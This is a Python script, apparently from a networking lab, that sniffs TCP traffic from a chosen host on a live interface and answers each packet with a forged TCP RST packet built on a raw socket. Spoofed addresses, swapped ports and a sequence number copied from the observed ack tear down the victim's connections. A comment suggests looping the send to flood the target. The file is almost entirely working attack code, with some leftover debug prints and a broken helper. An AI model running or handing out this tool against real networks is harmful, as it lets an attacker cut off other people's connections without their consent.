import socket 
from struct import *
import datetime
import pcapy
import sys


def eth_addr (a) :
	b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" 
	return b



def checksum(msg):
	#msg = msg.encode('unicode')
	s = 0
	for i in range(0,len(msg),2):
		w = (ord(msg[i])<<8) + (ord(msg[i+1]))
		s = s+w

	s = (s>>16) + (s & 0xffff);
	#s = s + (s >> 16);
	#complement and mask to 4 byte short
	s = ~s & 0xffff
	return s

def makeTCPHeader(tcp_source,tcp_dest,tcp_doff,tcp_seq,source_ip,dest_ip) :
	tcp_offset_res = (tcp_doff << 4) + 0
	#tcp_flags = (tcp_rst << 2)
	tcp_fin = 0
	tcp_syn = 0
	tcp_rst = 1
	tcp_psh = 0
	tcp_ack = 0
	tcp_urg = 0
	tcp_window = socket.htons (11680)	#	maximum allowed window size
	tcp_check = 0
	tcp_urg_ptr = 0
	tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
	tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

	source_address=socket.inet_aton(source_ip)
	dest_address =socket.inet_aton(dest_ip)
	placeholder =0
	protocol =socket.IPPROTO_TCP
	tcp_length = len(tcp_header)

	psh = pack('!4s4sBBH', source_address, dest_address, placeholder,protocol,tcp_length)
	psh =psh +tcp_header
	print psh
	print type(psh)

	tcp_checksum = checksum (psh)
	tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack, tcp_offset_res, tcp_flags,  tcp_window, tcp_checksum , tcp_urg_ptr)
	return tcp_header


def tcp_spoof(s_addr,d_addr,source_port,dest_port,seq,ack) :

	s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
	s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
	packet = ''

	#ip header fields
	ip_ihl = 5
	ip_ver = 4
	ip_tos = 0
	ip_tos = 0
	ip_tot_len = 0
	ip_frag_off = 0
	ip_ttl = 255
	ip_proto = socket.IPPROTO_TCP
	ip_check = 0
	ip_id=54321
	ip_saddr = socket.inet_aton (d_addr)
	ip_daddr = socket.inet_aton (s_addr)

	ip_ihl_ver = (ip_ver << 4) +ip_ihl
	ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
	#tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
	
	#tcp header fields

	tcp_source = dest_port
	tcp_dest = source_port
	tcp_doff = 5
	tcp_seq = ack
	tcp_ack_seq=0
	

	#tcp_offset_res = (tcp_doff << 4) + 0
	#tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
	tcp_header= makeTCPHeader(tcp_source,tcp_dest,tcp_doff,tcp_seq,s_addr,d_addr)
# the ! in the pack format string means network order
	#tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)



# final full packet - syn packets dont have any data
	packet = ip_header + tcp_header

#Send the packet finally - the port specified has no effect
	s.sendto(packet, (s_addr , 0 ))	# put this in a loop if you want to flood the target

def parse_packet(packet) :

	eth_length = 14
#	eth_header = packet[:eth_length]
#	eth = unpack('!6s6sH' , eth_header)
#	eth_protocol = socket.ntohs(eth[2])

#	if eth_protocol == 8 :
		#Parse IP header
		#take first 20 characters for the ip header
	ip_header = packet[eth_length:20+eth_length]
	
	#now unpack them :)
	iph = unpack('!BBHHHBBH4s4s' , ip_header)

	version_ihl = iph[0]
	version = version_ihl >> 4
	ihl = version_ihl & 0xF

	iph_length = ihl * 4

	ttl = iph[5]
	protocol = iph[6]
	s_addr = socket.inet_ntoa(iph[8]);
	d_addr = socket.inet_ntoa(iph[9]);
	#if s_addr != "10.0.2.4" && d_addr!="10.0.2.5"
	#	return None
	#print('Source Address : '+s_addr+' Destination Address : '+d_addr)
	#TCP protocol
	
	
	#if protocol == 6:
	t = iph_length + eth_length
	tcp_header = packet[t:t+20]

	#now unpack them :)
	tcph = unpack('!HHLLBBHHH' , tcp_header)

	source_port = tcph[0]
	dest_port = tcph[1]
	sequence = tcph[2]
	acknowledgement = tcph[3]
	doff_reserved = tcph[4]
	tcph_length = doff_reserved >> 4
	#print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)
	tcp_spoof(s_addr,d_addr,source_port,dest_port,sequence,acknowledgement)
	#return s_addr,d_addr,source_port,dest_port,sequence,acknowledgement,tcph_length
			#can continue from here
#socket.gethostbyname()


def main():
	devices = pcapy.findalldevs()
	#print devices
	#bppfilter = "dst host 10.0.2.4 and src host 10.0.2.5 and tcp"
	bppfilter = 'src host 10.0.2.5 and tcp'
	cap = pcapy.open_live("enp0s3",65536,1,0)
	cap.setfilter(bppfilter)
	#cap.setfilter("TCP")

	while True:
		header,packet = cap.next()
		parse_packet(packet)

main()


